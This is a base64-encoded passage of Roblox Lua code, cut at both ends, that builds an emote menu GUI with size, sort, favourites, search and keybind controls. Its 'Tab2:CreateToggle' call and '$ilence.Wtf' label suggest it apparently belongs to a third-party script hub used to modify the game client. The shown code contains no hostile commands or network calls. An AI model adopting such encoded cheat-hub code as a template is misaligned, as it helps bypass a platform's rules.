b3V0T3JkZXIKU2l6ZUxpc3QuUGFyZW50ID0gU2l6ZUZyYW1lCgpsb2NhbCBmdW5jdGlvbiBDcmVhdGVTaXplKG9yZGVyLCB0ZXh0LCBzaXplKQoJbG9jYWwgYnV0dG9uID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKCWJ1dHRvbi5TaXplQ29uc3RyYWludCA9IEVudW0uU2l6ZUNvbnN0cmFpbnQuUmVsYXRpdmVYWAoJYnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMC4yLCAwKQoJYnV0dG9uLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzMCwgMzAsIDMwKQoJYnV0dG9uLkxheW91dE9yZGVyID0gb3JkZXIKCWJ1dHRvbi5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQoJYnV0dG9uLlRleHQgPSB0ZXh0CglidXR0b24uVGV4dFNjYWxlZCA9IHRydWUKCWJ1dHRvbi5Cb3JkZXJTaXplUGl4ZWwgPSAwCglDb3JuZXI6Q2xvbmUoKS5QYXJlbnQgPSBidXR0b24KCWJ1dHRvbi5QYXJlbnQgPSBTaXplRnJhbWUKCWJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKCQlTaXplRnJhbWUuVmlzaWJsZSA9IGZhbHNlCgkJQ3VycmVudFNpemUgPSBzaXplCgkJbG9jYWwgc2NhbGUgPSBTaXplU2NhbGVzW3NpemVdCgkJQmFja0ZyYW1lLlNpemUgPSBVRGltMi5uZXcoMC45ICogc2NhbGUsIDAsIDAuNSAqIHNjYWxlLCAwKQoJZW5kKQoJcmV0dXJuIGJ1dHRvbgplbmQKQ3JlYXRlU2l6ZSgxLCAiU21hbGwiLCAic21hbGwiKQpDcmVhdGVTaXplKDIsICJNZWRpdW0iLCAibWVkaXVtIikKQ3JlYXRlU2l6ZSgzLCAiTGFyZ2UiLCAibGFyZ2UiKQoKbG9jYWwgR3JpZFNpemVGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQpHcmlkU2l6ZUZyYW1lLlZpc2libGUgPSBmYWxzZQpHcmlkU2l6ZUZyYW1lLkJvcmRlclNpemVQaXhlbCA9IDAKR3JpZFNpemVGcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygxLCA1LCAtMC4yMjUsIDApCkdyaWRTaXplRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygwLjIsIDAsIDAsIDApCkdyaWRTaXplRnJhbWUuQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZCkdyaWRTaXplRnJhbWUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKQ29ybmVyOkNsb25lKCkuUGFyZW50ID0gR3JpZFNpemVGcmFtZQpHcmlkU2l6ZUZyYW1lLlBhcmVudCA9IEJhY2tGcmFtZQoKbG9jYWwgR3JpZFNpemVMaXN0ID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiKQpHcmlkU2l6ZUxpc3QuUGFkZGluZyA9IFVEaW0ubmV3KDAuMDIsIDApCkdyaWRTaXplTGlzdC5Ib3Jpem9udGFsQWxpZ25tZW50ID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LkNlbnRlcgpHcmlkU2l6ZUxpc3QuVmVydGljYWxBbGlnbm1lbnQgPSBFbnVtLlZlcnRpY2FsQWxpZ25tZW50LlRvcApHcmlkU2l6ZUxpc3QuU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKR3JpZFNpemVMaXN0LlBhcmVudCA9IEdyaWRTaXplRnJhbWUKCmxvY2FsIGZ1bmN0aW9uIENyZWF0ZUdyaWRTaXplKG9yZGVyLCB0ZXh0LCBzaXplKQoJbG9jYWwgYnV0dG9uID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKCWJ1dHRvbi5TaXplQ29uc3RyYWludCA9IEVudW0uU2l6ZUNvbnN0cmFpbnQuUmVsYXRpdmVYWAoJYnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMC4yLCAwKQoJYnV0dG9uLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzMCwgMzAsIDMwKQoJYnV0dG9uLkxheW91dE9yZGVyID0gb3JkZXIKCWJ1dHRvbi5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQoJYnV0dG9uLlRleHQgPSB0ZXh0CglidXR0b24uVGV4dFNjYWxlZCA9IHRydWUKCWJ1dHRvbi5Cb3JkZXJTaXplUGl4ZWwgPSAwCglDb3JuZXI6Q2xvbmUoKS5QYXJlbnQgPSBidXR0b24KCWJ1dHRvbi5QYXJlbnQgPSBHcmlkU2l6ZUZyYW1lCglidXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCgkJR3JpZFNpemVGcmFtZS5WaXNpYmxlID0gZmFsc2UKCQlDdXJyZW50R3JpZFNpemUgPSBzaXplCgkJR3JpZC5DZWxsU2l6ZSA9IEdyaWRTaXplU2NhbGVzW3NpemVdCgllbmQpCglyZXR1cm4gYnV0dG9uCmVuZApDcmVhdGVHcmlkU2l6ZSgxLCAiU21hbGwiLCAic21hbGwiKQpDcmVhdGVHcmlkU2l6ZSgyLCAiTWVkaXVtIiwgIm1lZGl1bSIpCkNyZWF0ZUdyaWRTaXplKDMsICJMYXJnZSIsICJsYXJnZSIpCgpsb2NhbCBTaXplQnV0dG9uID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKU2l6ZUJ1dHRvbi5Cb3JkZXJTaXplUGl4ZWwgPSAwClNpemVCdXR0b24uQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSkKU2l6ZUJ1dHRvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjkyNSwgLTUsIC0wLjE4NSwgMCkKU2l6ZUJ1dHRvbi5TaXplID0gVURpbTIubmV3KDAuMTUsIDAsIDAuMSwgMCkKU2l6ZUJ1dHRvbi5UZXh0U2NhbGVkID0gdHJ1ZQpTaXplQnV0dG9uLlRleHRDb2xvcjMgPSBDb2xvcjMubmV3KDEsIDEsIDEpClNpemVCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5uZXcoMCwgMCwgMCkKU2l6ZUJ1dHRvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC4zClNpemVCdXR0b24uVGV4dCA9ICJTaXplIgpTaXplQnV0dG9uLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJU2l6ZUZyYW1lLlZpc2libGUgPSBub3QgU2l6ZUZyYW1lLlZpc2libGUKCWlmIFNpemVGcmFtZS5WaXNpYmxlIHRoZW4KCQlHcmlkU2l6ZUZyYW1lLlZpc2libGUgPSBmYWxzZQoJCVNvcnRGcmFtZS5WaXNpYmxlID0gZmFsc2UKCWVuZAplbmQpCkNvcm5lcjpDbG9uZSgpLlBhcmVudCA9IFNpemVCdXR0b24KU2l6ZUJ1dHRvbi5QYXJlbnQgPSBCYWNrRnJhbWUKCmxvY2FsIEdyaWRTaXplQnV0dG9uID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKR3JpZFNpemVCdXR0b24uQm9yZGVyU2l6ZVBpeGVsID0gMApHcmlkU2l6ZUJ1dHRvbi5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KQpHcmlkU2l6ZUJ1dHRvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjc3LCAtNSwgLTAuMTg1LCAwKQpHcmlkU2l6ZUJ1dHRvbi5TaXplID0gVURpbTIubmV3KDAuMTUsIDAsIDAuMSwgMCkKR3JpZFNpemVCdXR0b24uVGV4dFNjYWxlZCA9IHRydWUKR3JpZFNpemVCdXR0b24uVGV4dENvbG9yMyA9IENvbG9yMy5uZXcoMSwgMSwgMSkKR3JpZFNpemVCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5uZXcoMCwgMCwgMCkKR3JpZFNpemVCdXR0b24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuMwpHcmlkU2l6ZUJ1dHRvbi5UZXh0ID0gIkVtb3RlIFNpemUiCkdyaWRTaXplQnV0dG9uLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJR3JpZFNpemVGcmFtZS5WaXNpYmxlID0gbm90IEdyaWRTaXplRnJhbWUuVmlzaWJsZQoJaWYgR3JpZFNpemVGcmFtZS5WaXNpYmxlIHRoZW4KCQlTaXplRnJhbWUuVmlzaWJsZSA9IGZhbHNlIAoJCVNvcnRGcmFtZS5WaXNpYmxlID0gZmFsc2UKCWVuZAplbmQpCkNvcm5lcjpDbG9uZSgpLlBhcmVudCA9IEdyaWRTaXplQnV0dG9uCkdyaWRTaXplQnV0dG9uLlBhcmVudCA9IEJhY2tGcmFtZQoKbG9jYWwgVG9nZ2xlUmFuZG9tQnV0dG9uID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKVG9nZ2xlUmFuZG9tQnV0dG9uLkJvcmRlclNpemVQaXhlbCA9IDAKVG9nZ2xlUmFuZG9tQnV0dG9uLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpClRvZ2dsZVJhbmRvbUJ1dHRvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjY3LCAtNSwgLTAuMTg1LCAwKQpUb2dnbGVSYW5kb21CdXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLjA0LCAwLCAwLjA4LCAwKQpUb2dnbGVSYW5kb21CdXR0b24uVGV4dFNjYWxlZCA9IHRydWUKVG9nZ2xlUmFuZG9tQnV0dG9uLlRleHRDb2xvcjMgPSBDb2xvcjMubmV3KDEsIDEsIDEpClRvZ2dsZVJhbmRvbUJ1dHRvbi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLm5ldygwLCAwLCAwKQpUb2dnbGVSYW5kb21CdXR0b24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuMwpUb2dnbGVSYW5kb21CdXR0b24uVGV4dCA9ICLwn46yIgpUb2dnbGVSYW5kb21CdXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCglzaG93UmFuZG9tID0gbm90IHNob3dSYW5kb20KCVRvZ2dsZVJhbmRvbUJ1dHRvbi5UZXh0ID0gc2hvd1JhbmRvbSBhbmQgIvCfjrIiIG9yICLinYwiCglsb2NhbCByYW5kb21CdXR0b24gPSBGcmFtZTpGaW5kRmlyc3RDaGlsZCgicmFuZG9tIikKCWlmIHJhbmRvbUJ1dHRvbiB0aGVuCgkJcmFuZG9tQnV0dG9uLlZpc2libGUgPSBzaG93UmFuZG9tCgllbmQKZW5kKQpDb3JuZXI6Q2xvbmUoKS5QYXJlbnQgPSBUb2dnbGVSYW5kb21CdXR0b24KVG9nZ2xlUmFuZG9tQnV0dG9uLlBhcmVudCA9IEJhY2tGcmFtZQoKbG9jYWwgU29ydEZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpClNvcnRGcmFtZS5WaXNpYmxlID0gZmFsc2UKU29ydEZyYW1lLkJvcmRlclNpemVQaXhlbCA9IDAKU29ydEZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDEsIDUsIC0wLjEyNSwgMCkKU29ydEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMC4yLCAwLCAwLCAwKQpTb3J0RnJhbWUuQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZClNvcnRGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQpDb3JuZXI6Q2xvbmUoKS5QYXJlbnQgPSBTb3J0RnJhbWUKU29ydEZyYW1lLlBhcmVudCA9IEJhY2tGcmFtZQoKbG9jYWwgU29ydExpc3QgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIpClNvcnRMaXN0LlBhZGRpbmcgPSBVRGltLm5ldygwLjAyLCAwKQpTb3J0TGlzdC5Ib3Jpem9udGFsQWxpZ25tZW50ID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LkNlbnRlcgpTb3J0TGlzdC5WZXJ0aWNhbEFsaWdubWVudCA9IEVudW0uVmVydGljYWxBbGlnbm1lbnQuVG9wClNvcnRMaXN0LlNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyClNvcnRMaXN0LlBhcmVudCA9IFNvcnRGcmFtZQoKbG9jYWwgZnVuY3Rpb24gU29ydEVtb3RlcygpCglmb3IgaSwgRW1vdGUgaW4gcGFpcnMoRW1vdGVzKSBkbwoJCWxvY2FsIEVtb3RlQnV0dG9uID0gRnJhbWU6RmluZEZpcnN0Q2hpbGQoRW1vdGUuaWQpCgkJaWYgbm90IEVtb3RlQnV0dG9uIHRoZW4KCQkJY29udGludWUKCQllbmQKCQlsb2NhbCBJc0Zhdm9yaXRlZCA9IHRhYmxlLmZpbmQoRmF2b3JpdGVkRW1vdGVzLCBFbW90ZS5pZCkKCQlFbW90ZUJ1dHRvbi5MYXlvdXRPcmRlciA9IEVtb3RlLnNvcnRbQ3VycmVudFNvcnRdICsgKChJc0Zhdm9yaXRlZCBhbmQgMCkgb3IgI0Vtb3RlcykKCQlFbW90ZUJ1dHRvbi5udW1iZXIuVGV4dCA9IEVtb3RlLnNvcnRbQ3VycmVudFNvcnRdCgllbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBjcmVhdGVzb3J0KG9yZGVyLCB0ZXh0LCBzb3J0KQoJbG9jYWwgQ3JlYXRlZFNvcnQgPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQoJQ3JlYXRlZFNvcnQuU2l6ZUNvbnN0cmFpbnQgPSBFbnVtLlNpemVDb25zdHJhaW50LlJlbGF0aXZlWFgKCUNyZWF0ZWRTb3J0LlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMC4yLCAwKQoJQ3JlYXRlZFNvcnQuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgMzApCglDcmVhdGVkU29ydC5MYXlvdXRPcmRlciA9IG9yZGVyCglDcmVhdGVkU29ydC5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQoJQ3JlYXRlZFNvcnQuVGV4dCA9IHRleHQKCUNyZWF0ZWRTb3J0LlRleHRTY2FsZWQgPSB0cnVlCglDcmVhdGVkU29ydC5Cb3JkZXJTaXplUGl4ZWwgPSAwCglDb3JuZXI6Q2xvbmUoKS5QYXJlbnQgPSBDcmVhdGVkU29ydAoJQ3JlYXRlZFNvcnQuUGFyZW50ID0gU29ydEZyYW1lCglDcmVhdGVkU29ydC5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKCQlTb3J0RnJhbWUuVmlzaWJsZSA9IGZhbHNlCgkJQ3VycmVudFNvcnQgPSBzb3J0CgkJU29ydEVtb3RlcygpCgllbmQpCglyZXR1cm4gQ3JlYXRlZFNvcnQKZW5kCgpjcmVhdGVzb3J0KDEsICJOZXdlc3QgRmlyc3QiLCAibmV3ZXN0Zmlyc3QiKQpjcmVhdGVzb3J0KDIsICJPbGRlc3QgRmlyc3QiLCAib2xkZXN0Zmlyc3QiKQpjcmVhdGVzb3J0KDMsICJBbHBoYWJldGljYWxseSBGaXJzdCIsICJhbHBoYWJldGljZmlyc3QiKQpjcmVhdGVzb3J0KDQsICJBbHBoYWJldGljYWxseSBMYXN0IiwgImFscGhhYmV0aWNsYXN0IikKY3JlYXRlc29ydCg1LCAiSGlnaGVzdCBQcmljZSIsICJoaWdoZXN0cHJpY2UiKQpjcmVhdGVzb3J0KDYsICJMb3dlc3QgUHJpY2UiLCAibG93ZXN0cHJpY2UiKQpjcmVhdGVzb3J0KDcsICJVR0MgRmlyc3QiLCAidWdjZmlyc3QiKQpjcmVhdGVzb3J0KDgsICJSb2Jsb3ggRmlyc3QiLCAicm9ibG94Zmlyc3QiKQoKbG9jYWwgU29ydEJ1dHRvbiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpClNvcnRCdXR0b24uQm9yZGVyU2l6ZVBpeGVsID0gMApTb3J0QnV0dG9uLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpClNvcnRCdXR0b24uUG9zaXRpb24gPSBVRGltMi5uZXcoMC45MjUsIC01LCAtMC4wNzUsIDApClNvcnRCdXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLjE1LCAwLCAwLjEsIDApClNvcnRCdXR0b24uVGV4dFNjYWxlZCA9IHRydWUKU29ydEJ1dHRvbi5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQpTb3J0QnV0dG9uLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMubmV3KDAsIDAsIDApClNvcnRCdXR0b24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuMwpTb3J0QnV0dG9uLlRleHQgPSAiU29ydCIKU29ydEJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKCVNvcnRGcmFtZS5WaXNpYmxlID0gbm90IFNvcnRGcmFtZS5WaXNpYmxlCmVuZCkKQ29ybmVyOkNsb25lKCkuUGFyZW50ID0gU29ydEJ1dHRvbgpTb3J0QnV0dG9uLlBhcmVudCA9IEJhY2tGcmFtZQoKbG9jYWwgVG9nZ2xlQ2xvc2VCdXR0b24gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQpUb2dnbGVDbG9zZUJ1dHRvbi5Cb3JkZXJTaXplUGl4ZWwgPSAwClRvZ2dsZUNsb3NlQnV0dG9uLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpClRvZ2dsZUNsb3NlQnV0dG9uLlBvc2l0aW9uID0gVURpbTIubmV3KDAuODI1LCAtNSwgLTAuMDc1LCAwKQpUb2dnbGVDbG9zZUJ1dHRvbi5TaXplID0gVURpbTIubmV3KDAuMDQsIDAsIDAuMDgsIDApClRvZ2dsZUNsb3NlQnV0dG9uLlRleHRTY2FsZWQgPSB0cnVlClRvZ2dsZUNsb3NlQnV0dG9uLlRleHRDb2xvcjMgPSBDb2xvcjMubmV3KDEsIDEsIDEpClRvZ2dsZUNsb3NlQnV0dG9uLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMubmV3KDAsIDAsIDApClRvZ2dsZUNsb3NlQnV0dG9uLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjMKVG9nZ2xlQ2xvc2VCdXR0b24uVGV4dCA9ICLwn5GAIgpDb3JuZXI6Q2xvbmUoKS5QYXJlbnQgPSBUb2dnbGVDbG9zZUJ1dHRvbgpUb2dnbGVDbG9zZUJ1dHRvbi5QYXJlbnQgPSBCYWNrRnJhbWUKVG9nZ2xlQ2xvc2VCdXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCglzaG91bGRDbG9zZU9uRW1vdGUgPSBub3Qgc2hvdWxkQ2xvc2VPbkVtb3RlCglUb2dnbGVDbG9zZUJ1dHRvbi5UZXh0ID0gc2hvdWxkQ2xvc2VPbkVtb3RlIGFuZCAi8J+RgCIgb3IgIvCflJIiCmVuZCkKCmxvY2FsIFRvZ2dsZUZhdm9yaXRlc0J1dHRvbiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpClRvZ2dsZUZhdm9yaXRlc0J1dHRvbi5Cb3JkZXJTaXplUGl4ZWwgPSAwClRvZ2dsZUZhdm9yaXRlc0J1dHRvbi5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNywgMC41KQpUb2dnbGVGYXZvcml0ZXNCdXR0b24uUG9zaXRpb24gPSBVRGltMi5uZXcoMC43OSwgLTUsIC0wLjA3NSwgMCkKVG9nZ2xlRmF2b3JpdGVzQnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMC4wNCwgMCwgMC4wOCwgMCkKVG9nZ2xlRmF2b3JpdGVzQnV0dG9uLlRleHRTY2FsZWQgPSB0cnVlClRvZ2dsZUZhdm9yaXRlc0J1dHRvbi5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQpUb2dnbGVGYXZvcml0ZXNCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5uZXcoMCwgMCwgMCkKVG9nZ2xlRmF2b3JpdGVzQnV0dG9uLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjMKVG9nZ2xlRmF2b3JpdGVzQnV0dG9uLlRleHQgPSAi4q2QIgpDb3JuZXI6Q2xvbmUoKS5QYXJlbnQgPSBUb2dnbGVGYXZvcml0ZXNCdXR0b24KVG9nZ2xlRmF2b3JpdGVzQnV0dG9uLlBhcmVudCA9IEJhY2tGcmFtZQpUb2dnbGVGYXZvcml0ZXNCdXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCglzaG93RmF2b3JpdGVzID0gbm90IHNob3dGYXZvcml0ZXMKCVRvZ2dsZUZhdm9yaXRlc0J1dHRvbi5UZXh0ID0gc2hvd0Zhdm9yaXRlcyBhbmQgIuKtkCIgb3IgIuKdjCIKCWZvciBfLCBidXR0b24gaW4gaXBhaXJzKEZyYW1lOkdldENoaWxkcmVuKCkpIGRvCgkJaWYgYnV0dG9uOklzQSgiR3VpQnV0dG9uIikgYW5kIGJ1dHRvbi5OYW1lIH49ICJyYW5kb20iIHRoZW4KCQkJbG9jYWwgZmF2b3JpdGVJY29uID0gYnV0dG9uOkZpbmRGaXJzdENoaWxkKCJmYXZvcml0ZSIpCgkJCWlmIGZhdm9yaXRlSWNvbiB0aGVuCgkJCQlmYXZvcml0ZUljb24uVmlzaWJsZSA9IHNob3dGYXZvcml0ZXMKCQkJZW5kCgkJZW5kCgllbmQKZW5kKQoKbG9jYWwgQ2xvc2VCdXR0b24gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQpDbG9zZUJ1dHRvbi5Cb3JkZXJTaXplUGl4ZWwgPSAwCkNsb3NlQnV0dG9uLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpCkNsb3NlQnV0dG9uLlBvc2l0aW9uID0gVURpbTIubmV3KDAuMDc1LCAwLCAtMC4wNzUsIDApCkNsb3NlQnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMC4xNSwgMCwgMC4xLCAwKQpDbG9zZUJ1dHRvbi5UZXh0U2NhbGVkID0gdHJ1ZQpDbG9zZUJ1dHRvbi5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQpDbG9zZUJ1dHRvbi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLm5ldygwLCAwLCAwKQpDbG9zZUJ1dHRvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC4zCkNsb3NlQnV0dG9uLlRleHQgPSAiQ2xvc2UiCkNsb3NlQnV0dG9uLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJU2NyZWVuR3VpLkVuYWJsZWQgPSBmYWxzZQplbmQpCkNvcm5lcjpDbG9uZSgpLlBhcmVudCA9IENsb3NlQnV0dG9uCkNsb3NlQnV0dG9uLlBhcmVudCA9IEJhY2tGcmFtZQoKbG9jYWwgU2VhcmNoQmFyID0gSW5zdGFuY2UubmV3KCJUZXh0Qm94IikKU2VhcmNoQmFyLkJvcmRlclNpemVQaXhlbCA9IDAKU2VhcmNoQmFyLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpClNlYXJjaEJhci5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjQ3NSwgMCwgLTAuMDc1LCAwKQpTZWFyY2hCYXIuU2l6ZSA9IFVEaW0yLm5ldygwLjU1LCAwLCAwLjEsIDApClNlYXJjaEJhci5UZXh0U2NhbGVkID0gdHJ1ZQpTZWFyY2hCYXIuUGxhY2Vob2xkZXJUZXh0ID0gIlNlYXJjaCIKU2VhcmNoQmFyLlRleHRDb2xvcjMgPSBDb2xvcjMubmV3KDEsIDEsIDEpClNlYXJjaEJhci5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLm5ldygwLCAwLCAwKQpTZWFyY2hCYXIuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuMwpTZWFyY2hCYXI6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJUZXh0Iik6Q29ubmVjdChmdW5jdGlvbigpCglsb2NhbCB0ZXh0ID0gU2VhcmNoQmFyLlRleHQ6bG93ZXIoKQoJbG9jYWwgYnV0dG9ucyA9IEZyYW1lOkdldENoaWxkcmVuKCkKCWlmIHRleHQgfj0gdGV4dDpzdWIoMSw1MCkgdGhlbgoJCVNlYXJjaEJhci5UZXh0ID0gdGV4dDpzdWIoMSw1MCkKCQl0ZXh0ID0gU2VhcmNoQmFyLlRleHQ6bG93ZXIoKQoJZW5kCglpZiB0ZXh0IH49ICIiIHRoZW4KCQlmb3IgaSxidXR0b24gaW4gcGFpcnMoYnV0dG9ucykgZG8KCQkJaWYgYnV0dG9uOklzQSgiR3VpQnV0dG9uIikgdGhlbgoJCQkJbG9jYWwgbmFtZSA9IGJ1dHRvbjpHZXRBdHRyaWJ1dGUoIm5hbWUiKTpsb3dlcigpCgkJCQlpZiBuYW1lOm1hdGNoKHRleHQpIHRoZW4KCQkJCQlidXR0b24uVmlzaWJsZSA9IHRydWUKCQkJCWVsc2UKCQkJCQlidXR0b24uVmlzaWJsZSA9IGZhbHNlCgkJCQllbmQKCQkJZW5kCgkJZW5kCgllbHNlCgkJZm9yIGksYnV0dG9uIGluIHBhaXJzKGJ1dHRvbnMpIGRvCgkJCWlmIGJ1dHRvbjpJc0EoIkd1aUJ1dHRvbiIpIHRoZW4KCQkJCWJ1dHRvbi5WaXNpYmxlID0gdHJ1ZQoJCQllbmQKCQllbmQKCWVuZAplbmQpCkNvcm5lcjpDbG9uZSgpLlBhcmVudCA9IFNlYXJjaEJhcgpTZWFyY2hCYXIuUGFyZW50ID0gQmFja0ZyYW1lCgpsb2NhbCBmdW5jdGlvbiBvcGVuZW1vdGVzKG5hbWUsIHN0YXRlLCBpbnB1dCkKCWlmIHN0YXRlID09IEVudW0uVXNlcklucHV0U3RhdGUuQmVnaW4gYW5kIGlzTWVudUVuYWJsZWQgdGhlbgoJCVNjcmVlbkd1aS5FbmFibGVkID0gbm90IFNjcmVlbkd1aS5FbmFibGVkCgllbmQKZW5kCgpUYWIyOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lID0gIlRvZ2dsZSBFbW90ZSBHdWkgKCRpbGVuY2UuV3RmKSIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgaXNNZW51RW5hYmxlZCA9IHZhbHVlCiAgICAgICAgaWYgdmFsdWUgdGhlbgogICAgICAgICAgICBpZiBJc1N0dWRpbyB0aGVuCiAgICAgICAgICAgICAgICBDb250ZXh0QWN0aW9uU2VydmljZTpCaW5kQWN0aW9uQXRQcmlvcml0eSgKICAgICAgICAgICAgICAgICAgICAiRW1vdGUgTWVudSIsCiAgICAgICAgICAgICAgICAgICAgb3BlbmVtb3RlcywKICAgICAgICAgICAgICAgICAgICB0cnVlLAogICAgICAgICAgICAgICAgICAgIDIwMDEsCiAgICAgICAgICAgICAgICAgICAgRW51bS5LZXlDb2RlLkNvbW1hCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIENvbnRleHRBY3Rpb25TZXJ2aWNlOkJpbmRDb3JlQWN0aW9uQXRQcmlvcml0eSgKICAgICAgICAgICAgICAgICAgICAiRW1vdGUgTWVudSIsCiAgICAgICAgICAgICAgICAgICAgb3BlbmVtb3RlcywKICAgICAgICAgICAgICAgICAgICB0cnVlLAogICAgICAgICAgICAgICAgICAgIDIwMDEsCiAgICAgICAgICAgICAgICAgICAgRW51bS5LZXlDb2RlLkNvbW1hCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVsc2UKICAgICAgICAgICAgaWYgSXNTdHVkaW8gdGhlbgogICAgICAgICAgICAgICAgQ29udGV4dEFjdGlvblNlcnZpY2U6VW5iaW5kQWN0aW9uKCJFbW90ZSBNZW51IikKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgQ29udGV4dEFjdGlvblNlcnZpY2U6VW5iaW5kQ29yZUFjdGlvbigiRW1vdGUgTWVudSIpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBTY3JlZW5HdWkuRW5hYmxlZCA9IGZhbHNlIC0tIENsb3NlIHRoZSBtZW51IGlmIGl0J3Mgb3BlbiB3aGVuIGRpc2FibGVkCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCmxvY2FsIGlucHV0Y29ubmVjdApTY3JlZW5HdWk6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJFbmFibGVkIik6Q29ubmVjdChmdW5jdGlvbigpCglpZiBTY3JlZW5HdWkuRW5hYmxlZCA9